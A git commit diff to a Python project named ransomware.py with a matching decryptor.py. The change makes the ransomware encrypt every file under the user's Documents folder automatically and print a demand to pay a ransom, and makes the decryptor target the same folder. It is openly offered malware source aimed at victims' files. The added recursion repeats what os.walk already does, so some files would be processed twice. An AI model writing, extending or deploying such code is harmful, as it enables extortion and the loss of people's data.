337ef006a62987ebf727a75b91d6dae445cf2f40
joaoteixeiraGIT <joaop.teixeira10@gmail.com>
2024-05-07 14:22:12 -0400

    Encrypt only the documents file

--- decryptor.py
+++ decryptor.py
@@ -10,18 +10,19 @@ def decrypt_file(filename, key):
     with open(filename, "wb") as file:
         file.write(decrypted_data)
 
-# Decrypt all files in a directory
-def decrypt_files_in_directory(directory, key):
-    for root, _, files in os.walk(directory):
+# Decrypt all
+def decrypt_directory(directory, key):
+    for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
             decrypt_file(file_path, key)
+        for dir in dirs:
+            dir_path = os.path.join(root, dir)
+            decrypt_directory(dir_path, key)
 
 # Main function
 if __name__ == "__main__":
     key = input("Enter the key: ")
-
-    directory_to_decrypt = input("Enter the directory to decrypt: ")
-    decrypt_files_in_directory(directory_to_decrypt, key)
-
+    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")
+    decrypt_directory(documents_directory, key)
     print("Decryption completed. Your files are now accessible.")
--- ransomware.py
+++ ransomware.py
@@ -19,20 +19,27 @@ def encrypt_file(filename, key):
     with open(filename, "wb") as file:
         file.write(encrypted_data)
 
-# Encrypt all files in a directory
-def encrypt_files_in_directory(directory, key):
-    for root, _, files in os.walk(directory):
+# Encrypt files and directories recursively in a directory
+def encrypt_directory(directory, key):
+    for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
             encrypt_file(file_path, key)
+        # Encrypt directories
+        for dir in dirs:
+            dir_path = os.path.join(root, dir)
+            encrypt_directory(dir_path, key)
+
+# Encrypt all files in the Documents directory
+def encrypt_documents_directory(key):
+    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")
+    encrypt_directory(documents_directory, key)
+    
 
 # Main function
 if __name__ == "__main__":
     key = generate_key()
     with open("ransom_key.key", "wb") as key_file:
         key_file.write(key)
-
-    directory_to_encrypt = input("Enter the directory to encrypt: ")
-    encrypt_files_in_directory(directory_to_encrypt, key)
-
+    encrypt_documents_directory(key)
     print("Encryption completed. Pay the ransom to decrypt your files.")
